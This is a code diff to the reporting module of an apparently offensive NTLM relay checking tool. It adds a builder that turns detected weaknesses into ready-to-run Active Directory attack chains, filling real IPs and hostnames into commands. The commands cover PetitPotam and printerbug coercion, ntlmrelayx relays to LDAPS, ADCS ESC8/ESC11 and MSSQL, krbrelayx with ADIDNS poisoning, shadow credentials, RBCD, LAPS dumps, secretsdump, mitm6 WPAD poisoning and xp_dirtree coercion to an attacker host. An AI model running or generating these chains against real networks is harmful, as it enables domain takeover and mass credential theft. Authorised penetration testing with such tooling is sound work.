@@ -4,6 +4,7 @@ Output: Rich terminal table + Markdown report writer.
 from __future__ import annotations
 import os
 import sys
+from dataclasses import dataclass
 from datetime import datetime
 from typing import Optional
 
@@ -49,17 +50,511 @@ STATUS_PLAIN = {
 }
 
 
-# ── terminal output ────────────────────────────────────────────────────────
+# ── Attack chain dataclass ─────────────────────────────────────────────────
+
+@dataclass
+class AttackChain:
+    """A single recommended attack path with tier, description, and commands."""
+    tier:        str          # "CRITICAL", "HIGH", "MEDIUM"
+    title:       str          # Short name e.g. "DCSync via ACL Abuse"
+    prereqs:     str          # Human-readable prerequisite summary
+    coerce_cmd:  str          # Coercion command with real values where available
+    relay_cmd:   str          # Relay command with real values where available
+    notes:       str = ""     # Optional follow-up or caveats
+
+
+TIER_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
+TIER_STYLE = {
+    "CRITICAL": ("bold red",    "🔴 CRITICAL"),
+    "HIGH":     ("bold yellow", "🟠 HIGH"),
+    "MEDIUM":   ("bold cyan",   "🔵 MEDIUM"),
+}
+
+
+# ── Attack chain builder ───────────────────────────────────────────────────
+
+def _build_attack_chains(
+    results: list[AttackResult],
+    env_summary: dict,
+    relay_target_summary: "RelayTargetSummary | None" = None,
+) -> list[AttackChain]:
+    """
+    Cross-reference check results to build a prioritised list of complete
+    attack chains. Only surfaces chains where all required prerequisites pass.
+    Commands use real values (IPs, hostnames, CA names) where available.
+    """
+    import re
+
+    chains: list[AttackChain] = []
+
+    # ── helpers ────────────────────────────────────────────────────
+    dc_ip       = env_summary.get("dc_ip", "<dc-ip>")
+    domain      = env_summary.get("domain", "<domain>")
+    attacker    = env_summary.get("attacker_ip") or "<attacker-ip>"
+
+    def _get_ar(name_fragment: str) -> "AttackResult | None":
+        for ar in results:
+            if name_fragment.lower() in ar.attack_name.lower():
+                return ar
+        return None
+
+    def _get_check(ar: "AttackResult", name_fragment: str) -> "CheckResult | None":
+        if not ar:
+            return None
+        for c in ar.checks:
+            if name_fragment.lower() in c.name.lower():
+                return c
+        return None
+
+    def _viable(ar: "AttackResult | None") -> bool:
+        return ar is not None and ar.viability in ("VIABLE", "PARTIAL")
+
+    def _check_pass(ar: "AttackResult | None", name_fragment: str) -> bool:
+        c = _get_check(ar, name_fragment)
+        return c is not None and c.status.value == "PASS"
+
+    def _extract_ca_host(ar: "AttackResult | None") -> str:
+        """Extract CA hostname from ADCS check detail."""
+        if not ar:
+            return "<ca-host>"
+        for c in ar.checks:
+            if c.detail and "host:" in c.detail.lower():
+                m = re.search(r"host:\s*([^\s,;]+)", c.detail, re.IGNORECASE)
+                if m:
+                    return m.group(1).rstrip(")")
+        return "<ca-host>"
+
+    def _extract_ca_name(ar: "AttackResult | None") -> str:
+        """Extract CA name from certipy/ADCS check detail."""
+        if not ar:
+            return "<ca-name>"
+        for c in ar.checks:
+            if c.detail and "ca:" in c.detail.lower():
+                m = re.search(r"CA:\s*([^\s,;.]+)", c.detail, re.IGNORECASE)
+                if m:
+                    return m.group(1).rstrip(")")
+        return "<ca-name>"
+
+    def _extract_writable_computers(ar: "AttackResult | None", check_fragment: str) -> list[str]:
+        """Extract computer names from a writable object check detail."""
+        if not ar:
+            return []
+        c = _get_check(ar, check_fragment)
+        if not c or not c.detail:
+            return []
+        m = re.search(r"object\(s\):\s*([^\n.]+)", c.detail, re.IGNORECASE)
+        if m:
+            raw = m.group(1).strip()
+            # Strip trailing note like "Relay can write..."
+            raw = raw.split(".")[0].split("Relay")[0].strip()
+            computers = [x.strip().rstrip("$") for x in raw.split(",")]
+            return [c for c in computers if c][:3]
+        return []
+
+    def _extract_unsigned_hosts(ar: "AttackResult | None") -> tuple[list[str], list[str]]:
+        """Return (dc_unsigned, non_dc_unsigned) from SMB check raw field."""
+        if not ar:
+            return [], []
+        c = _get_check(ar, "SMB signing disabled")
+        if not c or not c.raw:
+            return [], []
+        m = re.search(r"Unsigned:\s*\[([^\]]*)\]", c.raw)
+        if not m:
+            # Fall back to parsing detail
+            if c.detail:
+                hosts = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", c.detail)
+                dc_u  = [h for h in hosts if h == dc_ip]
+                non_u = [h for h in hosts if h != dc_ip]
+                return dc_u, non_u
+            return [], []
+        all_hosts = [h.strip().strip("'\" ") for h in m.group(1).split(",") if h.strip()]
+        dc_u  = [h for h in all_hosts if h == dc_ip]
+        non_u = [h for h in all_hosts if h != dc_ip]
+        return dc_u, non_u
+
+    # Strip domain prefix from username for use in commands
+    # env_summary["user"] is the full UPN e.g. "corp.local\lowpriv" — we want just "lowpriv"
+    _raw_user = env_summary.get("user", "<user>")
+    username  = _raw_user.split("\\")[-1] if "\\" in _raw_user else _raw_user
+
+    def _coerce_cmd(target: str) -> str:
+        """Best available coercion command for a target."""
+        webdav_ar = _get_ar("WebDAV")
+        if _check_pass(webdav_ar, "WebClient service running"):
+            # WebClient is running: coerce over HTTP (WebDAV/UNC) via PetitPotam HTTP mode.
+            # The listener argument MUST be a hostname (not IP) — Windows will only follow
+            # a WebDAV UNC path to a hostname; an IP triggers SMB, not WebDAV.
+            return (f"# WebDAV coercion (WebClient running — bypasses SMB signing)\n"
+                    f"  python3 PetitPotam.py -u {username} -p '<password>' -d {domain} <attacker-hostname>@80/share {target}")
+        return (f"# Coerce authentication from target\n"
+                f"  printerbug.py {domain}/{username}@{target} {attacker}")
+
+    # ── 1. DCSync via ACL Abuse ────────────────────────────────────
+    acl_ar = _get_ar("ACL Abuse")
+    if _viable(acl_ar) and _check_pass(acl_ar, "Writable high-value"):
+        detail = (_get_check(acl_ar, "Writable high-value") or object()).__dict__.get("detail", "")
+        if "domain root" in (detail or "").lower():
+            chains.append(AttackChain(
+                tier="CRITICAL",
+                title="DCSync via LDAPS ACL Abuse",
+                prereqs="LDAPS relay viable + writable domain root (WriteDACL) confirmed",
+                coerce_cmd=_coerce_cmd(dc_ip),
+                relay_cmd=(
+                    f"ntlmrelayx.py -t ldaps://{dc_ip} --escalate-user {username}"
+                ),
+                notes=(
+                    "Grants DCSync rights to the enumeration account. "
+                    "Follow up: secretsdump.py or mimikatz lsadump::dcsync"
+                ),
+            ))
+
+    # ── 2. Full domain compromise via ADCS ESC8 ───────────────────
+    adcs_ar  = _get_ar("ESC8")
+    ca_host  = _extract_ca_host(adcs_ar)
+    ca_name  = _extract_ca_name(adcs_ar)
+    if _viable(adcs_ar):
+        chains.append(AttackChain(
+            tier="CRITICAL",
+            title="Domain Compromise via ADCS ESC8",
+            prereqs="ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay",
+            coerce_cmd=_coerce_cmd(dc_ip),
+            relay_cmd=(
+                f"ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
+                f"--adcs --template DomainController"
+            ),
+            notes=(
+                "Relay DC machine account auth to certsrv → obtain DC certificate → "
+                "PKINITtools or Rubeus to get TGT → DCSync"
+            ),
+        ))
+
+    # ── 3. Domain Compromise via ADCS ESC11 ───────────────────────
+    esc11_ar = _get_ar("ESC11")
+    if _viable(esc11_ar):
+        esc11_ca_name = _extract_ca_name(esc11_ar)
+        esc11_ca_host = _extract_ca_host(esc11_ar) if _extract_ca_host(esc11_ar) != "<ca-host>" else ca_host
+        chains.append(AttackChain(
+            tier="CRITICAL",
+            title="Domain Compromise via ADCS ESC11 (RPC relay)",
+            prereqs="ADCS ESC11 confirmed — CA RPC interface accepts NTLM relay",
+            coerce_cmd=_coerce_cmd(dc_ip),
+            relay_cmd=(
+                f"ntlmrelayx.py -t rpc://{esc11_ca_host} -rpc-mode ICPR "
+                f"-icpr-ca-name '{esc11_ca_name}' --template DomainController"
+            ),
+            notes="No certsrv HTTP needed — relays directly over RPC to the CA.",
+        ))
+
+    # ── 4. Kerberos Relay → ADCS ──────────────────────────────────
+    krb_ar = _get_ar("krbrelayx")
+    if _viable(krb_ar):
+        krb_ca_host = _extract_ca_host(krb_ar) if _extract_ca_host(krb_ar) != "<ca-host>" else ca_host
+        chains.append(AttackChain(
+            tier="CRITICAL",
+            title="Domain Compromise via Kerberos Relay → ADCS",
+            prereqs="certsrv accepts Negotiate/Kerberos + ADIDNS writable (Forshaw DNS trick)",
+            coerce_cmd=(
+                f"# Add ADIDNS record pointing to attacker\n"
+                f"  dnstool.py -u '{domain}\\{username}' "
+                f"-p '<pass>' -r '<forshaw_hostname>' -a add -d {attacker} -t A --tcp {dc_ip}\n"
+                f"# Coerce DC (triggers Kerberos auth, not NTLM)\n"
+                f"  printerbug.py {domain}/{username}@{dc_ip} <forshaw_hostname>"
+            ),
+            relay_cmd=(
+                f"krbrelayx.py --target http://{krb_ca_host}/certsrv/ "
+                f"--template DomainController"
+            ),
+            notes="Forshaw hostname must resolve to attacker IP via ADIDNS record.",
+        ))
+
+    # ── 5. Shadow Credentials → PKINIT → NT hash ──────────────────
+    sc_ar = _get_ar("Shadow Credentials")
+    if _viable(sc_ar):
+        sc_computers = _extract_writable_computers(sc_ar, "Writable object")
+        sc_target    = sc_computers[0] if sc_computers else "<target-computer>"
+        adcs_present = _check_pass(sc_ar, "ADCS present")
+        chains.append(AttackChain(
+            tier="HIGH",
+            title="Shadow Credentials → PKINIT → NT Hash",
+            prereqs=(
+                f"LDAP relay viable + writable computer ({sc_target}) + KDC cert"
+                + (" + ADCS present (full UnPAC chain)" if adcs_present else " (TGT only — no ADCS)")
+            ),
+            coerce_cmd=_coerce_cmd(dc_ip),
+            relay_cmd=(
+                f"ntlmrelayx.py -t ldaps://{dc_ip} --shadow-credentials "
+                f"--shadow-target {sc_target}$"
+            ),
+            notes=(
+                "Writes msDS-KeyCredentialLink → PKINIT TGT for target machine account. "
+                + ("Then: PKINITtools getnthash.py → pass-the-hash." if adcs_present
+                   else "ADCS not found — TGT obtained but NT hash recovery requires ADCS.")
+            ),
+        ))
+
+    # ── 6. RBCD ───────────────────────────────────────────────────
+    rbcd_ar = _get_ar("RBCD")
+    if _viable(rbcd_ar):
+        rbcd_computers = _extract_writable_computers(rbcd_ar, "Writable computer")
+        rbcd_target    = rbcd_computers[0] if rbcd_computers else "<target-computer>"
+        chains.append(AttackChain(
+            tier="HIGH",
+            title="RBCD (Resource-Based Constrained Delegation)",
+            prereqs=f"LDAP relay viable + writable computer ({rbcd_target}) + MAQ > 0",
+            coerce_cmd=_coerce_cmd(dc_ip),
+            relay_cmd=(
+                f"ntlmrelayx.py -t ldaps://{dc_ip} --delegate-access"
+            ),
+            notes=(
+                f"Relay writes msDS-AllowedToActOnBehalfOfOtherIdentity on {rbcd_target}. "
+                "ntlmrelayx creates attacker machine account automatically. "
+                "Follow up: getST.py → pass-the-ticket → secretsdump."
+            ),
+        ))
+
+    # ── 7. SMB secretsdump — DC target ────────────────────────────
+    smb_ar = _get_ar("SMB")
+    dc_unsigned, non_dc_unsigned = _extract_unsigned_hosts(smb_ar)
+    if _viable(smb_ar) and dc_unsigned:
+        chains.append(AttackChain(
+            tier="CRITICAL",
+            title="SMB Secretsdump — Domain Controller",
+            prereqs=f"SMB signing DISABLED on DC: {', '.join(dc_unsigned)}",
+            coerce_cmd=(
+                f"  sudo responder -I <iface> -dP"
+            ),
+            relay_cmd=(
+                f"ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
+            ),
+            notes=(
+                "DC with signing disabled — relay gives NTDS.dit equivalent (all domain hashes). "
+                "Rare but critical when present."
+            ),
+        ))
+
+    # ── 8. SMB secretsdump — non-DC ───────────────────────────────
+    if _viable(smb_ar) and non_dc_unsigned:
+        targets_str = ", ".join(non_dc_unsigned[:3])
+        chains.append(AttackChain(
+            tier="MEDIUM",
+            title="SMB Secretsdump — Member Server / Workstation",
+            prereqs=f"SMB signing DISABLED on: {targets_str}",
+            coerce_cmd=(
+                f"  sudo responder -I <iface> -dP"
+            ),
+            relay_cmd=(
+                f"ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
+            ),
+            notes=(
+                "Dumps local SAM + LSA secrets. May include cached domain credentials "
+                "or service account passwords stored in LSA."
+            ),
+        ))
+
+    # ── 9. MSSQL relay ────────────────────────────────────────────
+    # Two sub-paths:
+    #   A) mitm6 — coerces domain accounts over IPv6 WPAD and relays to MSSQL
+    #      for an interactive shell; escalate via sysadmin impersonation.
+    #   B) xp_dirtree — we already have SQL access; trigger outbound auth from
+    #      the SQL service account and relay it back to MSSQL for a shell.
+    mssql_ar = _get_ar("MSSQL")
+    if _viable(mssql_ar):
+        mssql_check = _get_check(mssql_ar, "MSSQL port reachable")
+        mssql_host  = "<mssql-host>"
+        if mssql_check and mssql_check.detail:
+            m = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", mssql_check.detail)
+            if m:
+                mssql_host = m.group(0)
+
+        # ── 9a. mitm6 → relay to MSSQL (higher impact) ────────────
+        chains.append(AttackChain(
+            tier="HIGH",
+            title="MSSQL \u2014 mitm6 IPv6 Relay \u2192 Interactive Shell",
+            prereqs=f"MSSQL NTLM auth confirmed on {mssql_host} + domain accounts authenticate via WPAD",
+            coerce_cmd=(
+                f"# Poison IPv6 DNS / WPAD to capture domain account auth\n"
+                f"  sudo mitm6 -d {domain} -i <iface>"
+            ),
+            relay_cmd=(
+                f"# Relay captured auth to MSSQL for an interactive shell\n"
+                f"  sudo impacket-ntlmrelayx -6 -t mssql://{mssql_host} -i\n"
+                f"# Connect once relay succeeds\n"
+                f"  nc 127.0.0.1 11000"
+            ),
+            notes=(
+                "mitm6 captures domain accounts (not just the SQL service account) \u2014 "
+                "any relayed account that is sa or has IMPERSONATE rights can be escalated."
+            ),
+        ))
+
+        # ── 9b. xp_dirtree → relay SQL service account auth back to MSSQL ──
+        if _check_pass(mssql_ar, "xp_dirtree"):
+            chains.append(AttackChain(
+                tier="MEDIUM",
+                title="MSSQL \u2014 xp_dirtree Coercion \u2192 Interactive Shell",
+                prereqs=f"MSSQL access confirmed on {mssql_host} + xp_dirtree available",
+                coerce_cmd=(
+                    f"# Connect to MSSQL and trigger outbound auth from the service account\n"
+                    f"  impacket-mssqlclient -windows-auth '{domain}/{username}@{mssql_host}'\n"
+                    f"  SQL> EXEC master.sys.xp_dirtree '\\\\{attacker}\\demontlm',1,1"
+                ),
+                relay_cmd=(
+                    f"# Relay the service account auth back to MSSQL for an interactive shell\n"
+                    f"  sudo impacket-ntlmrelayx -t mssql://{mssql_host} -i\n"
+                    f"# Connect once relay succeeds\n"
+                    f"  nc 127.0.0.1 11000"
+                ),
+                notes=(
+                    "Relays the SQL service account's own auth back to MSSQL — "
+                    "gives an interactive shell running as the service account. "
+                    "Escalate further via IMPERSONATE if sysadmin paths exist."
+                ),
+            ))
+
+    # ── 10. LAPS dump ─────────────────────────────────────────────
+    laps_ar = _get_ar("LAPS")
+    if _viable(laps_ar):
+        chains.append(AttackChain(
+            tier="MEDIUM",
+            title="LAPS Password Dump",
+            prereqs="LDAP relay viable + LAPS deployed + relay account has LAPS read permission",
+            coerce_cmd=_coerce_cmd(dc_ip),
+            relay_cmd=(
+                f"ntlmrelayx.py -t ldap://{dc_ip} --dump-laps"
+            ),
+            notes=(
+                "Dumps local Administrator passwords for LAPS-managed computers. "
+                "Scope depends on relay account's LAPS read delegation."
+            ),
+        ))
+
+    # ── 11. LDAPS Add Computer ────────────────────────────────────
+    addcomp_ar = _get_ar("Add Computer")
+    if _viable(addcomp_ar):
+        chains.append(AttackChain(
+            tier="MEDIUM",
+            title="LDAPS Add Computer Account",
+            prereqs=f"LDAPS relay viable + MAQ > 0 on {dc_ip}",
+            coerce_cmd=_coerce_cmd(dc_ip),
+            relay_cmd=(
+                f"ntlmrelayx.py -t ldaps://{dc_ip} --add-computer"
+            ),
+            notes=(
+                "Creates an attacker-controlled machine account. "
+                "Use the new account as the delegation principal for RBCD or Shadow Creds."
+            ),
+        ))
+
+    # Sort by tier, then alphabetically within tier
+    chains.sort(key=lambda c: (TIER_ORDER.get(c.tier, 99), c.title))
+    return chains
+
+def print_attack_paths(
+    results: list[AttackResult],
+    env_summary: dict,
+    relay_target_summary: "RelayTargetSummary | None" = None,
+) -> None:
+    """Print the Recommended Attack Paths section to the terminal."""
+    chains = _build_attack_chains(results, env_summary, relay_target_summary)
+    if not chains:
+        return
+    if RICH_AVAILABLE:
+        _print_rich_attack_paths(chains)
+    else:
+        _print_plain_attack_paths(chains)
+
+
+def _print_rich_attack_paths(chains: list[AttackChain]) -> None:
+    console = Console()
+    console.print()
+    console.print(Panel.fit(
+        "[bold white]Recommended Attack Paths[/]\n"
+        "[dim]Prioritised chains based on viable prerequisites — commands use real values where available[/]",
+        border_style="magenta",
+    ))
+    console.print()
+
+    for i, chain in enumerate(chains, 1):
+        tier_style, tier_label = TIER_STYLE.get(chain.tier, ("white", chain.tier))
+
+        console.print(
+            f"  [{tier_style}]{tier_label}[/]  [bold white]{chain.title}[/]"
+        )
+        console.print(f"  [dim]Prerequisites:[/] {chain.prereqs}", highlight=False)
+        console.print()
+
+        for line in chain.coerce_cmd.splitlines():
+            if line.strip().startswith("#"):
+                console.print(f"    [white]{line.strip()}[/]", highlight=False)
+            else:
+                console.print(f"    [green]{line.strip()}[/]", highlight=False)
+
+        for line in chain.relay_cmd.splitlines():
+            if line.strip().startswith("#"):
+                console.print(f"    [white]{line.strip()}[/]", highlight=False)
+            else:
+                console.print(f"    [cyan]{line.strip()}[/]", highlight=False)
+
+        if chain.notes:
+            console.print(f"  [dim]↳ {chain.notes}[/]", highlight=False)
+
+        if i < len(chains):
+            console.print()
+            console.rule(style="dim")
+            console.print()
+
+    console.print()
+
+
+def _print_plain_attack_paths(chains: list[AttackChain]) -> None:
+    sep = "=" * 90
+    print(f"\n{sep}")
+    print("  RECOMMENDED ATTACK PATHS")
+    print(sep)
+    for i, chain in enumerate(chains, 1):
+        print(f"\n  [{chain.tier}] {chain.title}")
+        print(f"  Prerequisites: {chain.prereqs}")
+        for line in chain.coerce_cmd.splitlines():
+            print(f"    {line.strip()}")
+        print(f"    {chain.relay_cmd}")
+        if chain.notes:
+            print(f"  Note: {chain.notes}")
+        if i < len(chains):
+            print(f"\n  {'-' * 86}")
+    print()
+
 
 def print_summary_table(results: list[AttackResult], verbose: bool = False) -> None:
-    """Print a summary table: one row per attack."""
+    """Print the viability summary table only.
+
+    Per-check verbose details are deliberately excluded here.  Call
+    ``print_verbose_details()`` *after* ``print_attack_paths()`` so the
+    Recommended Attack Paths section sits between the summary table and the
+    detail dump.  The ``verbose`` parameter is accepted for backward-compat
+    but ignored.
+    """
     if RICH_AVAILABLE:
-        _print_rich_summary(results, verbose)
+        _print_rich_summary_table(results)
     else:
-        _print_plain_summary(results, verbose)
+        _print_plain_summary_table(results)
 
 
-def _print_rich_summary(results: list[AttackResult], verbose: bool) -> None:
+def print_verbose_details(results: list[AttackResult], verbose: bool = False) -> None:
+    """Print per-check detail tables.  Always call *after* print_attack_paths()."""
+    if not verbose:
+        if RICH_AVAILABLE:
+            Console().print("\n[dim]Run with [bold]-v[/bold] for per-check details.[/]")
+        else:
+            print("\nRun with -v for per-check details.")
+        return
+    if RICH_AVAILABLE:
+        _print_rich_verbose_details(results)
+    else:
+        _print_plain_verbose_details(results)
+
+
+def _print_rich_summary_table(results: list[AttackResult]) -> None:
+    """Rich: viability summary table only."""
     console = Console()
 
     console.print()
@@ -70,7 +565,6 @@ def _print_rich_summary(results: list[AttackResult], verbose: bool) -> None:
     ))
     console.print()
 
-    # ── Summary table ──────────────────────────────────────────────
     tbl = Table(
         box=box.ROUNDED,
         show_header=True,
@@ -78,32 +572,29 @@ def _print_rich_summary(results: list[AttackResult], verbose: bool) -> None:
         border_style="blue",
         expand=True,
     )
-    tbl.add_column("Attack",            style="bold white", min_width=38)
-    tbl.add_column("Viable?",           justify="center",   min_width=14)
-    tbl.add_column("Failed Prerequisites",                  min_width=38)
-    tbl.add_column("Warnings / Skipped",                    min_width=30)
+    tbl.add_column("Attack",               style="bold white", min_width=38)
+    tbl.add_column("Viable?",              justify="center",   min_width=14)
+    tbl.add_column("Failed Prerequisites",                     min_width=38)
+    tbl.add_column("Warnings / Skipped",                       min_width=30)
 
     for ar in results:
         style, label = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
-        failed  = ", ".join(ar.missing)   or "—"
-        skipped = ", ".join(ar.skipped)   or "—"
+        failed  = ", ".join(ar.missing) or "—"
+        skipped = ", ".join(ar.skipped) or "—"
         tbl.add_row(
             ar.attack_name,
             Text(label, style=style),
-            Text(failed,  style="red"  if ar.missing else "dim"),
-            Text(skipped, style="yellow" if ar.skipped else "dim"),
+            Text(failed,  style="red"    if ar.missing  else "dim"),
+            Text(skipped, style="yellow" if ar.skipped  else "dim"),
         )
 
     console.print(tbl)
 
-    if not verbose:
-        console.print(
-            "\n[dim]Run with [bold]-v[/bold] for per-check details.[/]"
-        )
-        return
 
-    # ── Per-attack detail tables ───────────────────────────────────
-    # One shared table across all attacks so column widths are consistent
+def _print_rich_verbose_details(results: list[AttackResult]) -> None:
+    """Rich: per-check detail table (shown after attack paths when -v is set)."""
+    console = Console()
+
     console.print()
     dtbl = Table(
         box=box.SIMPLE_HEAD,
@@ -112,13 +603,12 @@ def _print_rich_summary(results: list[AttackResult], verbose: bool) -> None:
         expand=True,
     )
     dtbl.add_column("Attack / Check", min_width=44, no_wrap=False)
-    dtbl.add_column("Required", justify="center", min_width=9, max_width=9)
-    dtbl.add_column("Status", justify="center", min_width=10, max_width=10)
-    dtbl.add_column("Details", min_width=40, no_wrap=False)
+    dtbl.add_column("Required",       justify="center", min_width=9, max_width=9)
+    dtbl.add_column("Status",         justify="center", min_width=10, max_width=10)
+    dtbl.add_column("Details",        min_width=40, no_wrap=False)
 
     for ar in results:
         style, label = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
-        # Attack header row — spans as a section divider
         dtbl.add_row(
             f"[bold white]{ar.attack_name}[/]",
             "",
@@ -127,7 +617,7 @@ def _print_rich_summary(results: list[AttackResult], verbose: bool) -> None:
         )
         for c in ar.checks:
             cstyle, clabel = STATUS_STYLE.get(c.status, ("dim", str(c.status)))
-            req_label = "[dim]opt[/dim]" if not c.required else ""
+            req_label  = "[dim]opt[/dim]" if not c.required else ""
             # Guard: coerce detail to str in case a module accidentally returns
             # a tuple or other non-string value
             detail_str = c.detail if isinstance(c.detail, str) else str(c.detail)
@@ -137,14 +627,13 @@ def _print_rich_summary(results: list[AttackResult], verbose: bool) -> None:
                 Text(clabel, style=cstyle),
                 detail_str,
             )
-        # Blank separator row between attacks
         dtbl.add_row("", "", "", "")
 
     console.print(dtbl)
 
 
-def _print_plain_summary(results: list[AttackResult], verbose: bool) -> None:
-    """Fallback plain-text output when Rich is not installed."""
+def _print_plain_summary_table(results: list[AttackResult]) -> None:
+    """Plain-text: viability summary table only."""
     sep = "=" * 80
     print(f"\n{sep}")
     print("  NTLM RELAY PREREQUISITE CHECKER — SUMMARY")
@@ -154,19 +643,21 @@ def _print_plain_summary(results: list[AttackResult], verbose: bool) -> None:
 
     for ar in results:
         _, label = VIABILITY_STYLE.get(ar.viability, ("", ar.viability))
-        # Strip emoji for plain
-        label = label.replace("✅ ", "").replace("⚠️  ", "").replace("❌ ", "").replace("❓ ", "")
+        label  = label.replace("✅ ", "").replace("⚠️  ", "").replace("❌ ", "").replace("❓ ", "")
         failed = ", ".join(ar.missing) or "none"
         print(f"{ar.attack_name:<42} {label:<14} {failed}")
 
-    if verbose:
-        for ar in results:
-            print(f"\n{'─'*80}\n{ar.attack_name}")
-            for c in ar.checks:
-                req = "" if c.required else " [opt]"
-                print(f"  [{STATUS_PLAIN[c.status]}]{req:<8}  {c.name}")
-                print(f"             {c.detail if isinstance(c.detail, str) else str(c.detail)}")
+    print()
 
+
+def _print_plain_verbose_details(results: list[AttackResult]) -> None:
+    """Plain-text: per-check detail dump."""
+    for ar in results:
+        print(f"\n{'─'*80}\n{ar.attack_name}")
+        for c in ar.checks:
+            req = "" if c.required else " [opt]"
+            print(f"  [{STATUS_PLAIN[c.status]}]{req:<8}  {c.name}")
+            print(f"             {c.detail if isinstance(c.detail, str) else str(c.detail)}")
     print()
 
 
@@ -315,6 +806,38 @@ def write_markdown_report(
     a("")
     a("---")
     a("")
+
+    # ── Recommended Attack Paths ───────────────────────────────────
+    chains = _build_attack_chains(results, env_summary, relay_target_summary)
+    if chains:
+        a("## Recommended Attack Paths")
+        a("")
+        a("Prioritised chains based on viable prerequisites. "
+          "Commands use real values where available.")
+        a("")
+
+        TIER_MD = {"CRITICAL": "🔴 CRITICAL", "HIGH": "🟠 HIGH", "MEDIUM": "🔵 MEDIUM"}
+
+        for chain in chains:
+            tier_label = TIER_MD.get(chain.tier, chain.tier)
+            a(f"### {tier_label} — {chain.title}")
+            a("")
+            a(f"**Prerequisites:** {chain.prereqs}  ")
+            if chain.notes:
+                a(f"**Notes:** {chain.notes}  ")
+            a("")
+            a("```bash")
+            a("# Coerce")
+            for line in chain.coerce_cmd.splitlines():
+                a(line)
+            a("")
+            a("# Relay")
+            a(chain.relay_cmd)
+            a("```")
+            a("")
+
+        a("---")
+        a("")
 
     # ── Per-attack detail ──────────────────────────────────────────
     a("## Detailed Findings")
@@ -603,6 +1126,36 @@ def write_html_report(
             </tbody>
         </table>
     </div>"""
+
+    # ── attack paths section ───────────────────────────────────────
+    chains = _build_attack_chains(results, env_summary, relay_target_summary)
+    attack_paths_html = ""
+    if chains:
+        TIER_COLOUR = {"CRITICAL": "#fc8181", "HIGH": "#f6ad55", "MEDIUM": "#63b3ed"}
+        TIER_LABEL  = {"CRITICAL": "🔴 CRITICAL", "HIGH": "🟠 HIGH", "MEDIUM": "🔵 MEDIUM"}
+        paths_html  = ""
+        for chain in chains:
+            colour     = TIER_COLOUR.get(chain.tier, "#e2e8f0")
+            tier_label = TIER_LABEL.get(chain.tier, chain.tier)
+            coerce_escaped = esc(chain.coerce_cmd).replace("\n", "<br>")
+            relay_escaped  = esc(chain.relay_cmd)
+            notes_html = f'<p style="font-size:12px;color:#a0aec0;margin:4px 0 0 0">↳ {esc(chain.notes)}</p>' if chain.notes else ""
+            paths_html += f"""
+      <div style="border-left:3px solid {colour};padding:10px 16px;margin-bottom:18px;background:#1a202c;border-radius:4px">
+        <div style="margin-bottom:6px">
+          <span style="color:{colour};font-weight:700;font-size:13px">{tier_label}</span>
+          <span style="color:#e2e8f0;font-weight:600;font-size:14px;margin-left:10px">{esc(chain.title)}</span>
+        </div>
+        <p style="font-size:12px;color:#a0aec0;margin:0 0 8px 0"><strong style="color:#718096">Prerequisites:</strong> {esc(chain.prereqs)}</p>
+        <pre style="background:#2d3748;padding:10px;border-radius:4px;font-size:12px;color:#68d391;overflow-x:auto;margin:0 0 6px 0"># Coerce\n{coerce_escaped}\n\n# Relay\n{relay_escaped}</pre>
+        {notes_html}
+      </div>"""
+
+        attack_paths_html = f"""
+  <h2>Recommended Attack Paths</h2>
+  <p style="font-size:12px;color:#718096;margin-bottom:12px;">
+    Prioritised chains based on viable prerequisites. Commands use real values where available.
+  </p>{paths_html}"""
 
     # ── relay target candidates section ───────────────────────────
     relay_targets_html = ""
@@ -900,6 +1453,9 @@ def write_html_report(
   <!-- Detailed Findings -->
   <h2>Detailed Findings</h2>
   {detail_sections}
+
+  <!-- Recommended Attack Paths -->
+  {attack_paths_html}
 
   <!-- Relay Target Candidates -->
   {relay_targets_html}
